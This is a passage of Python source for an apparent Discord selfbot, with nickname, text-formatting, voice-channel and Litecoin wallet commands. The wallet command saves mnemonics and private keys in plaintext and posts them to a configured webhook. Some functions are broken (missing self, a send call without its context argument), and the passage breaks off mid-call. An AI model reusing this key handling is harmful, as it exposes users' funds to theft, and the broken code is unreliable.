    async def nickscan(self, ctx):
        await ctx.message.delete()
        status_msg = await ctx.send(content="Scanning for nicknames...")

        nicknames = []
        for guild in self.bot.guilds:
            member = guild.get_member(self.bot.user.id)
            if member and member.nick:
                nicknames.append(f"[{guild.name}]: {member.nick}\n")

        try:
            await status_msg.delete()
        except:
            pass

        message = f"""**Server Nicknames:
<:BadgeDeveloper:1290693804013129768> [Total]: {len(nicknames)}**

```{''.join(nicknames) if nicknames else 'No custom nicknames found.'}
```"""
        await send(ctx, "Nickname Scan", message)

    @commands.command(name="nickreset", aliases=["resetnick"], description="Resets all your nicknames in servers.")
    async def nickreset(self, ctx):
        await ctx.message.delete()
        status_msg = await ctx.send(content="Resetting nicknames...")

        reset_count = 0
        for guild in self.bot.guilds:
            member = guild.get_member(self.bot.user.id)
            if member and member.nick:
                try:
                    await member.edit(nick=None)
                    reset_count += 1
                except Exception as e:
                    pass

        try:
            await status_msg.delete()
        except:
            pass

        await send(ctx, "Nickname Reset", f"✅ Reset `{reset_count}` nicknames across all servers.")

class text(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def txt(self, ctx, *, content: str):
        await ctx.message.delete()
        txt_file = f"{selfbot_name} .txt"
        async with aiofiles.open(txt_file, 'w', encoding='utf-8') as f:
            await f.write(content)
        await ctx.send(file=discord.File(txt_file))
        os.remove(txt_file)

    @commands.command()
    async def text(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"             
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Create txt file** **:** **`{prefix}txt [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **red Text** **:** **`{prefix}red [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **green text** **:** **`{prefix}green [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **dark blue text** **:** **`{prefix}darkblue [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **blue text** **:** **`{prefix}blue [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **purple text** **:** **`{prefix}purple [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Strikethrough content** **:** **`{prefix}strike [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **shrug emoticon** **:** **`{prefix}shrug`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **table flip** **:** **`{prefix}tableflip`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **bold text** **:** **`{prefix}bold [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **italic text** **:** **`{prefix}italic [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **large text** **:** **`{prefix}large [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Capital letters content** **:** **`{prefix}capital [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Small letters Content** **:** **`{prefix}small [content]`**\n"                        
            f"<:bxbz_monet_lovenote:1290693793724497920> | **little text** **:** **`{prefix}little [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **big text** **:** **`{prefix}big [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **spoiler text** **:** **`{prefix}spoiler [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Underline content** **:** **`{prefix}underline [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Reverse the content** **:** **`{prefix}reverse [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Convert text to emojis** **:** **`{prefix}emojify [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Quote the content** **:** **`{prefix}quote [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Format content as code** **:** **`{prefix}codeblock [content]`**\n"
            f"<:bxbz_monet_lovenote:1290693793724497920> | **Flip the text** **:** **`{prefix}flip [content]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Text Commands__<:Titanz:1281243489635405827>", description)

    @commands.command(aliases=['cap','capitalize','capital'])
    async def caps(ctx, *, message: str):
        await ctx.send(message.upper())

    @commands.command()
    async def small(ctx, *, message: str):
        await ctx.send(message.lower())

    @commands.command()
    async def red(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"- {line}" for line in content.splitlines()])
        await ctx.send(f"```diff\n{formatted_content}\n```")

    @commands.command()
    async def green(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"+ {line}" for line in content.splitlines()])
        await ctx.send(f"```diff\n{formatted_content}\n```")

    @commands.command()
    async def darkblue(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"[{line}]" for line in content.splitlines()])
        await ctx.send(f"```ini\n{formatted_content}\n```")

    @commands.command()
    async def blue(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"[{line}]" for line in content.splitlines()])
        await ctx.send(f"```css\n{formatted_content}\n```")

    @commands.command()
    async def purple(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f".{line}" for line in content.splitlines()])
        await ctx.send(f"```asciidoc\n{formatted_content}\n```")

    @commands.command(aliases=['strike'])
    async def strikethrough(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"~~{line}~~" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def shrug(self, ctx):
        await ctx.message.delete()
        await ctx.send("¯\\_(ツ)_/¯")

    @commands.command()
    async def tableflip(self, ctx):
        await ctx.message.delete()
        await ctx.send("(╯°□°）╯︵ ┻━┻")

    @commands.command()
    async def bold(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"**{line}**" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def italic(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"*{line}*" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def large(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"# {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command(aliases=['lil'])
    async def little(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"-# {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def big(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"## {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def spoiler(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"||{line}||" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def underline(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"__{line}__" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def reverse(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([line[::-1] for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def emojify(self, ctx, *, content: str):
        await ctx.message.delete()
        emojis = []
        for char in content:
            if char.isalpha():
                emoji = f":regional_indicator_{char.lower()}:"
                emojis.append(emoji)
            elif char.isspace():
                emojis.append(" ")
            else:
                emojis.append(char)

        emojified_content = ''.join(emojis)
        await ctx.send(f"{emojified_content}")

    @commands.command()
    async def quote(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"> {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def codeblock(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"```{line}```" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def flip(self, ctx, *, content: str):
        await ctx.message.delete()
        flipped_content = self.flip_text(content)
        await ctx.send(f"{flipped_content}")

    def flip_text(self, text: str) -> str:
        # Custom flip mapping as specified
        flip_mapping = {
                            'a' : 'ɐ', 
                            'b' : 'q', 
                            'c' : 'ɔ', 
                            'd' : 'p', 
                            'e' : 'ǝ', 
                            'f' : 'ɟ', 
                            'g' : 'ƃ', 
                            'h' : 'ɥ', 
                            'i' : 'ᴉ', 
                            'j' : 'ɾ', 
                            'k' : 'ʞ', 
                            'l' : 'ʃ', 
                            'm' : 'ɯ', 
                            'n' : 'u', 
                            'o' : 'o', 
                            'p' : 'd', 
                            'q' : 'b', 
                            'r' : 'ɹ', 
                            's' : 's', 
                            't' : 'ʇ', 
                            'u' : 'n', 
                            'v' : 'ʌ', 
                            'w' : 'ʍ', 
                            'x' : 'x', 
                            'y' : 'ʎ', 
                            'z' : 'z',
                            ' ' : ' '
        }
        return ''.join(flip_mapping.get(char, char) for char in text)

tasks_dict = {}



class vc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def vckick(self, ctx, user: discord.Member):
        await ctx.message.delete()
        if user.voice and user.voice.channel:
            await user.move_to(None)
            await send(ctx, "VC Kick", f"<:white_arrow:1290693789824061461> User {user.name} has been kicked from the VC.")

    @commands.command()
    async def vcmoveall(self, ctx, channel1_id: int, channel2_id: int):
        await ctx.message.delete()
        channel1 = self.bot.get_channel(channel1_id)
        channel2 = self.bot.get_channel(channel2_id)
        if isinstance(channel1, discord.VoiceChannel) and isinstance(channel2, discord.VoiceChannel):
            members = channel1.members
            for member in members:
                await member.move_to(channel2)
            await send(ctx, "VC Move All", f"<:white_arrow:1290693789824061461> Moved all users from {channel1.name} to {channel2.name}.")

    @commands.command()
    async def vcmute(self, ctx, user: discord.Member):
        await ctx.message.delete()
        if user.voice and user.voice.channel:
            await user.edit(mute=True)
            await send(ctx, "VC Mute", f"<:white_arrow:1290693789824061461> {user.name} has been muted.")

    @commands.command()
    async def vcunmute(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.edit(mute=False)
            await send(ctx, "VC Unmute", f"<:white_arrow:1290693789824061461> {member.name} has been unmuted.")

    @commands.command()
    async def vcdeafen(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.edit(deafen=True)
            await send(ctx, "VC Deafen", f"<:white_arrow:1290693789824061461> {member.name} has been deafened.")

    @commands.command()
    async def vcundeafen(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.edit(deafen=False)
            await send(ctx, "VC Undeafen", f"<:white_arrow:1290693789824061461> {member.name} has been undeafened.")

    @commands.command()
    async def vcmove(self, ctx, member: discord.Member, channel: discord.VoiceChannel):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.move_to(channel)
            await send(ctx, "VC Move", f"<:white_arrow:1290693789824061461> Moved {member.name} to {channel.name}.")

    @commands.command(aliases=['247', 'joinvc'])
    async def vcjoin(self, ctx, channel: discord.VoiceChannel = None):
        await ctx.message.delete()
        if channel is None:
            if not ctx.author.voice or not ctx.author.voice.channel:
                return await senderror(ctx, "VC Error", "Join a voice channel or pass a channel.")
            channel = ctx.author.voice.channel

        class KeepAliveVoiceClient(discord.VoiceProtocol):
            def __init__(self, client, channel):
                self.client = client
                self.channel = channel
            async def connect(self, *, timeout, reconnect, self_deaf=True, self_mute=False):
                await self.channel.guild.change_voice_state(channel=self.channel, self_mute=self_mute, self_deaf=self_deaf)
            async def disconnect(self, *, force=False):
                await self.channel.guild.change_voice_state(channel=None)

        try:
            if ctx.voice_client and ctx.voice_client.channel.id == channel.id:
                return await send(ctx, "VC Join", f"<:white_arrow:1290693789824061461> Already connected to VC: {channel.name}.", "30")

            if ctx.voice_client:
                await ctx.voice_client.disconnect(force=True)

            await channel.connect(cls=KeepAliveVoiceClient, timeout=30, reconnect=True)
            await send(ctx, "VC Join", f"<:white_arrow:1290693789824061461> Successfully joined VC: {channel.name}.", "30")
        except Exception as e:
            await senderror(ctx, "VC Error", f"Failed to join VC: `{e}`")

    @commands.command(aliases=['leavevc'])
    async def vcleave(self, ctx):
        await ctx.message.delete()
        player = ctx.voice_client
        if not player:
            await send(ctx, "VC Leave", f"<:white_arrow:1290693789824061461> Bot is not in a VC.","30")
            return
        channel_name = player.channel.name
        try:
            if hasattr(self.bot, "lavalink"):
                ll_player = self.bot.lavalink.player_manager.get(ctx.guild.id)
                if ll_player:
                    ll_player.queue.clear()
                    await ll_player.stop()
        except Exception:
            pass
        await player.disconnect(force=True)
        await send(ctx, "VC Leave", f"<:white_arrow:1290693789824061461> Successfully left VC: {channel_name}.","30")

    @commands.command(aliases=['vc'])
    async def voicechat(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()
        content = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"                
            f"<:rd_VoiceIcon:1321112732770238545> | **Kick from VC** **:** **`{prefix}vckick <user>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Move from VCs** **:** **`{prefix}vcmoveall <channel1_id> <channel2_id>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Mute in VC** **:** **`{prefix}vcmute <user>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Unmute in VC** **:** **`{prefix}vcunmute <user>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Deafen in VC** **:** **`{prefix}vcdeafen <user>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Undeafen in VC** **:** **`{prefix}vcundeafen <user>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Move user to VC** **:** **`{prefix}vcmove <user> <channel>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Join VC 247** **:** **`{prefix}vcjoin <channel>`**\n"
            f"<:rd_VoiceIcon:1321112732770238545> | **Leave VC** **:** **`{prefix}vcleave`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__VC Commands__<:Titanz:1281243489635405827>", content)

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

class Wallet(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.TATUM_API = config.get('tatum_api_key')       
        self.private_key = config.get('private_key')

    def get_usd_to_inr_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['INR']
            else:
                return None
        except Exception as e:
            print(f"Error fetching exchange rate: {e}")
            return None

    def get_usd_to_eur_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['EUR']
            else:
                return None
        except Exception as e:
            print(f"Error fetching exchange rate: {e}")
            return None
    @commands.command(aliases=["my_tx", "mytx", "mytxhistory"])
    async def mytxhistory(self, ctx, wallet_num: int):
        """Fetches the last 5 transactions of the user's saved Litecoin address from wallets.json."""
        await ctx.message.delete()
        if wallet_num not in [1, 2, 3]:
            await send(ctx, "Wallet TX History", "<:CROSS_TDG:1321149916201881683> **Invalid wallet number! Choose between `1, 2, or 3`.**")
            return

        wallet_file = "database/wallets.json"
        if not os.path.exists(wallet_file):
            await send(ctx, "Wallet TX History", "<:CROSS_TDG:1321149916201881683> **No wallet data found!**")
            return

        try:
            with open(wallet_file, "r") as file:
                wallet_data = json.load(file)
        except Exception as e:
            await send(ctx, "Wallet TX History", f"<:CROSS_TDG:1321149916201881683> **Failed to read wallet data: {e}**")
            return

        if str(wallet_num) not in wallet_data:
            await send(ctx, "Wallet TX History", f"<:CROSS_TDG:1321149916201881683> **Wallet {wallet_num} not found!**")
            return

        address = wallet_data[str(wallet_num)].get("address")
        if not address or address == "Put Here" or address.strip() == "":
            await send(ctx, "Wallet TX History", f"<:CROSS_TDG:1321149916201881683> **Wallet {wallet_num} has no valid address configured!**")
            return

        API_URL = f"https://api.blockchair.com/litecoin/dashboards/address/{address}?transaction_details=true"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL) as response:
                    if response.status != 200:
                        await send(ctx, "Wallet TX History", "<:CROSS_TDG:1321149916201881683> **Invalid Litecoin address or no transaction history found!**")
                        return
                    data = await response.json()

            if "data" not in data or address not in data["data"]:
                await send(ctx, "Wallet TX History", "<:CROSS_TDG:1321149916201881683> **Invalid Litecoin address or no transaction history found!**")
                return

            transactions = data["data"][address]["transactions"]

            if not transactions:
                message = (
                    f"**No transactions found for this address!** <a:check:1281246680724930683>\n\n"
                    f"**<:RS_LTC:1291423858183897120> Wallet Number:** `Wallet {wallet_num}`\n"
                    f"**<:RS_LTC:1291423858183897120> Litecoin Address:**\n"
                    f"<:white_arrow:1290693789824061461>`{address}`"
                )
                await send(ctx, "__**LTC TX HISTORY**__ <a:tz_ltc:1281238097136451616>", message)
                return

            tx_messages = []
            for tx in transactions[:5]:  # Fetch latest 5 transactions
                tx_id = tx.get("hash", "N/A")
                amount_ltc = round(abs(tx.get("balance_change", 0) / 10**8), 8)  # Convert satoshis to LTC
                amount_usd = round(amount_ltc * 110, 2)  # Approximate USD value (1 LTC = $110)
                is_confirmed = tx.get("is_confirmed", False)
                status = "Confirmed <:lr_tick_1:1290693800808677461>" if is_confirmed else "Unconfirmed <:CROSS_TDG:1321149916201881683>"

                tx_messages.append(
                    f"\n<:rules:1290926829762383934> **Transaction ID: [Click Here](https://blockchair.com/litecoin/transaction/{tx_id})**\n"
                    f"<:exchanger:1322954180452810775> **Amount: {amount_usd}$ [ {amount_ltc} <:LTC:1322611807269031968> ]**\n"
                    f"<:emoji_1738342244745:1334928872269152259> **Status: {status}**"
                )

            final_message = (
                f"**Last {len(tx_messages)} transactions of the address!** <a:check:1281246680724930683>\n\n"
                f"**<:RS_LTC:1291423858183897120> Wallet Number:** `Wallet {wallet_num}`\n"
                f"**<:RS_LTC:1291423858183897120> Litecoin Address:**\n"
                f"<:white_arrow:1290693789824061461>`{address}`\n" +
                "".join(tx_messages)
            )
            await send(ctx, "__**LTC TX HISTORY**__ <a:tz_ltc:1281238097136451616>", final_message)

        except Exception as e:
            await send(ctx, "Wallet TX History", f"<:CROSS_TDG:1321149916201881683> **Error fetching transactions:** `{e}`")

    @commands.command()
    async def wallet(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"                
            f"<:Ownership:1290692081248895177> | **Gen wallet** **:** **`{prefix}genltc [name]`**\n"
            f"<:Ownership:1290692081248895177> | **Wallets info** **:** **`{prefix}checkwallet`**\n"
            f"<:Ownership:1290692081248895177> | **Del wallet** **:** **`{prefix}delwallet [name|ID]`**\n"
            f"<:Ownership:1290692081248895177> | **Import wallet** **:** **`{prefix}importwallet [name|ID] [Priv Key]`**\n"
            f"<:LTC:1322611807269031968> | **Send LTC** **:** **`{prefix}pay [amount] [addy] [ID]`**\n"
            f"<:LTC:1322611807269031968> | **Check balance** **:** **`{prefix}bal [addy|ID|all]`**\n"
            f"<:LTC:1322611807269031968> | **Your LTC address** **:** **`{prefix}addy [ID]`**\n"
            f"<:LTC:1322611807269031968> | **LTC QR code** **:** **`{prefix}ltcqr`**\n"
            f"<:LTC:1322611807269031968> | **UPI QR code** **:** **`{prefix}upiqr [slot_no] [amnt]`**\n"
            f"<:LTC:1322611807269031968> | **Set UPI ID** **:** **`{prefix}setupi [slot_no.] [upi_id]`**\n"
            f"<:LTC:1322611807269031968> | **Show UPI ID** **:** **`{prefix}upi [slot_no.|all]`**\n"
            f"<:LTC:1322611807269031968> | **SET RATES** **:** **`{prefix}setrate [i2c/c2i] [rate]`**\n"            
            f"<:LTC:1322611807269031968> | **USD to INR** **:** **`{prefix}c2i [amount]`**\n"
            f"<:LTC:1322611807269031968> | **INR to USD** **:** **`{prefix}i2c [amount]`**\n"
            f"<:LTC:1322611807269031968> | **USD to EUR** **:** **`{prefix}c2e [amount]`**\n"
            f"<:LTC:1322611807269031968> | **EUR to USD** **:** **`{prefix}e2c [amount]`**\n"
            f"<:LTC:1322611807269031968> | **USD to LTC** **:** **`{prefix}u2l [amount]`**\n"
            f"<:LTC:1322611807269031968> | **LTC to USD** **:** **`{prefix}l2u [amount]`**\n"
            f"<:LTC:1322611807269031968> | **My Tx History** **:** **`{prefix}mytxhistory [1|2|3]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )

        await send(ctx, "<:devs:1290693770567749652>__Wallet Commands__<:Titanz:1281243489635405827>", description)

    @commands.command()
    async def setupi(self, ctx, slot_number: int, *, upi_id):
        await ctx.message.delete()
        if not upi_id:
            return await senderror(ctx, "Error", "Please provide a valid UPI ID.")
        if slot_number < 1:
            return await senderror(ctx, "Error", "Slot number must be greater than 0.")
        try:
            with open("database/upi.json", "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            data = {}
        data[str(slot_number)] = {"upi_id": upi_id}
        with open("database/upi.json", "w") as f:
            json.dump(data, f, indent=4)
        await send(ctx, "UPI ID", f"<:white_arrow:1290693789824061461> UPI ID **`{upi_id}`** has been saved under slot `{slot_number}`.")

    @commands.command()
    async def upi(self, ctx, slot_number_or_all: str):
        arg = slot_number_or_all
        await ctx.message.delete()
        try:
            with open("database/upi.json", "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            return await senderror(ctx, "Error", "No UPI IDs have been set. Use `!setupi <slot_number> <upi_id>` to set one.")
        if str(arg).lower() == "all":
            if not data:
                return await senderror(ctx, "Error", "No UPI IDs found.")
            upi_list = [f"**{slot}** : `{info.get('upi_id', 'N/A')}`" for slot, info in data.items()]
            upi_str = "\n".join(upi_list)
            return await send(ctx, "All UPI IDs", upi_str)
        if not str(arg).isdigit():
            return await senderror(ctx, "Error", "Please provide a valid slot number or use `all` to list all.")
        slot_number = str(arg)
        slot_data = data.get(slot_number)
        if not slot_data:
            return await senderror(ctx, "Error", f"No UPI ID found for slot `{slot_number}`. Set one using `!setupi {slot_number} <upi_id>`.")
        upi_id = slot_data.get("upi_id")
        if not upi_id:
            return await senderror(ctx, "Error", f"UPI ID for slot `{slot_number}` is missing or invalid.")
        await send(ctx, "UPI ID", f"{upi_id}")
        await ctx.send(upi_id)


    @commands.command(name="genltc")
    async def genltc(self, ctx, wallet_name: str):
        await ctx.message.delete()

        webhook_message = None

        async with aiohttp.ClientSession() as session:
            headers = {
                "x-api-key": self.TATUM_API,
                "Content-Type": "application/json"
            }

            async with session.get("https://api.tatum.io/v3/litecoin/wallet", headers=headers) as resp:
                if resp.status != 200:
                    await ctx.send(f"❌ Tatum API Error (Wallet): {resp.status}", delete_after=5)
                    return
                wallet_data = await resp.json()

            xpub = wallet_data["xpub"]
            mnemonic = wallet_data["mnemonic"]

            async with session.get(f"https://api.tatum.io/v3/litecoin/address/{xpub}/0", headers=headers) as resp:
                if resp.status != 200:
                    await ctx.send(f"❌ Tatum API Error (Address): {resp.status}", delete_after=5)
                    return
                address_data = await resp.json()

            address = address_data["address"]

            payload = {
                "mnemonic": mnemonic,
                "index": 0
            }

            async with session.post("https://api.tatum.io/v3/litecoin/wallet/priv", headers=headers, json=payload) as resp:
                if resp.status != 200:
                    await ctx.send(f"❌ Tatum API Error (PrivateKey): {resp.status}", delete_after=5)
                    return
                priv_data = await resp.json()

            private_key = priv_data["key"]

        os.makedirs("database", exist_ok=True)
        wallet_file = "database/wallets.json"

        if os.path.exists(wallet_file):
            with open(wallet_file, "r") as f:
                wallets = json.load(f)
        else:
            wallets = {}

        wallet_id = str(max([int(i) for i in wallets.keys()], default=0) + 1)

        wallets[wallet_id] = {
            "id": int(wallet_id),
            "wallet_name": wallet_name,
            "mnemonic": mnemonic,
            "xpub": xpub,
            "address": address,
            "private_key": private_key
        }

        with open(wallet_file, "w") as f:
            json.dump(wallets, f, indent=4)

        with open("config.json", "r") as f:
            config = json.load(f)

        webhook_url = config.get("wallets_webhook_url")

        if webhook_url:
            embed = discord.Embed(title="🔐 New LTC Wallet Created", color=0x00ffcc)
            embed.add_field(name="ID", value=wallet_id, inline=False)
            embed.add_field(name="Name", value=wallet_name, inline=False)
            embed.add_field(name="Address", value=address, inline=False)
            embed.add_field(name="Secret Phrases", value=f"||{mnemonic}||", inline=False)
            embed.add_field(name="Private Key", value=f"||{private_key}||", inline=False)
            embed.add_field(name="Xpub", value=xpub, inline=False)
            embed.set_footer(text="Wallet data saved securely")

            webhook = discord.Webhook.from_url(webhook_url, client=ctx.bot)
            webhook_message = await webhook.send(embed=embed, wait=True)

        await send(
            "# __**LTC WALLET CREATED**__ <a:tz_ltc:1281238097136451616>\n"
            "<:white_Arrow:1290693791983861822> **Store the private key & Mnemonic code safely & securely !** <a:check:1281246680724930683>\n\n"
            f"**<:bxbz_monet_lovenote:1290693793724497920> Wallet Name: `{wallet_name}`**\n"
            f"**Wallet ID:** `Wallet {wallet_id}`\n\n"
            "<a:tz_ltc:1281238097136451616> **Address:**\n"
            f"`{address}`\n\n"
            "<:emoji_1738342244745:1334928872269152259> **Private Key:**\n"
            f"||{private_key}||\n\n"
